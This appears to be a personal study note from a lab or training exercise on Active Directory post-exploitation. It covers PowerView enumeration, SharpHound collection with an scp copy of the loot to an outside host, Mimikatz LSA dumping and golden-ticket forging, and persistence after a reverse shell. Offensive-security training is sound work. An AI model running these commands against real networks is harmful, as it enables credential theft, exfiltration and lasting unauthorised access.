---
description: Maintaining access with mimikatz, bloodhound, powerview and msfvenom
---

# Post-Exploitation Basics

### Powerview

<pre><code>powershell -ep bypass
. .\Downloads\PowerView.ps1   #init powerview, the dot at first loads script to environment not run it directly
<strong>Get-NetUser | select cn
</strong>Get-WmiObject -class Win32_Share
Get-NetComputer -fulldata | select operatingsystem
psexec.exe is used to run commands on other systems
</code></pre>

find the ultimate powerview cheatsheet

### Bloodhound

```
RHOST (Sharphound, the collector tool for bloodhound)
. .\Downloads\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip

#Apparently above commands are not for bloodhound 4.3 and above, use .exe instead

./SharpHound.exe --CollectionMethods All --ZipFileName output.zip
scp .\20240430053252_output.zip jtripz@10.9.200.182:/tmp #no extra perms needed

LHOST
neo4j console #username neo4j and pass you set
bloodhound
#importing graphs returned bad json file but uploading files worked
run analysis on these json files and graphs as required
```

<figure><img src="../.gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

### Mimikatz

```
privilege::debug #get 20 ok
lsadump::lsa /patch
kerberos::golden /user: /domain: /sid: /krbtgt: /id:
```

<div align="left"><figure><img src="../.gitbook/assets/image (61).png" alt="" width="435"><figcaption></figcaption></figure></div>

<div align="left"><figure><img src="../.gitbook/assets/image (62).png" alt="" width="394"><figcaption></figcaption></figure></div>

<figure><img src="../.gitbook/assets/image (63).png" alt=""><figcaption><p>FQDN of the domain, SID (Security Identifier) of the domain, username of the account you want access to and the KRBTGT NTLM hash.</p></figcaption></figure>

KRBTGT is an automatically created default account used when a Microsoft Active Directory domain is created. Its main purpose is to authenticate Kerberos tickets as the Key Distribution Center (KDC) account.

**Run persistence module on msf after establishing reverse shell to maintain a backdoor**
